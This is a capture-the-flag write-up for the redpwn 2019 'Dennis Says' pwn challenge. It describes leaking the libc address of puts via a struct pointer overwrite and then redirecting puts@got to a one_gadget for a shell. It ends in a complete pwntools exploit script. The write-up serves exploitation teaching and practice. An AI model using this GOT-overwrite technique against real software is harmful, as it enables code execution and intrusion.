# Dennis Says

## Pwn - Points: 344

> Written by: blevy
>
> 
>
> It's like "Simon Says," but with less memory safety.
>
> 
>
> `nc chall2.2019.redpwn.net 4006`
>
> [dennis.c](dennis.c)
>
> [dennis](dennis)
>
> [libc-2.23.so](libc-2.23.so)
>

The binary is a typical menu challenge and provides various actions. The exploit code first allocates `spm` on the heap via `greet` and writes the address of `puts@got` and the `spm` symbol into the static spm struct via `eat`:

```c
static struct spm {
	struct spm *spm;
	struct spm *spmm;
} *spm;

```

Then it uses `yeet` to modify the pointer `*spm`, that points to the allocated chunk on the heap, to point to `puts@got`.

```c
static void yeet(void)
{
	puts("Dennis yeet");
	memcpy(spm->spmm, spm, sizeof(spm));
}
```

We can now read the first 4 bytes with `writ` to leak the `puts` address of `libc` and can calculate the address for `one_gadget`.

Then we overwrite the `puts@got` pointer to point to `one_gadget` with another write action via `eat` and trigger a `puts` call to spawn a shell.

Exploit script:

```python
from pwn import *

libc = ELF('./libc-2.23.so')

e = ELF('./dennis')

p = process('./dennis')
# context.terminal = ['termite', '-e']
# p = gdb.debug('./dennis')
p.recvuntil(': ')

# malloc to initialize spm struct on the heap
p.sendline('1')
p.recvuntil(': ')
p.sendline('0')
p.recvuntil(': ')

# write into spm struct
# 
# static struct spm {
#	struct spm *spm;  -> puts@got
#	struct spm *spmm; -> spm symbol
# } *spm;
p.sendline('4')
p.recvuntil(': ')
p.sendline(p32(e.got['puts'])+p32(e.symbols['spm']))
p.recvuntil(': ')

# dereference puts@got by modifying spm symbol to point to puts@got
p.sendline('3')
p.recvuntil(': ')

# read first 4 bytes of spm that points to puts@got to leak puts libc address
p.sendline('2')
p.recvuntil(': ')
p.sendline('4')

puts = u32(p.recv(4))
log.info(hex(puts))

libc_base = puts - libc.symbols['puts']
one_gadget = libc_base + 0x3a61c

p.recvuntil(': ')
p.interactive()

# write one_gadget to puts@got
p.sendline('4')
p.recvuntil(': ')
p.sendline(p32(one_gadget))
p.recvuntil(': ')

# any input to cause a puts call
p.sendline('0wn3d')
p.interactive()
```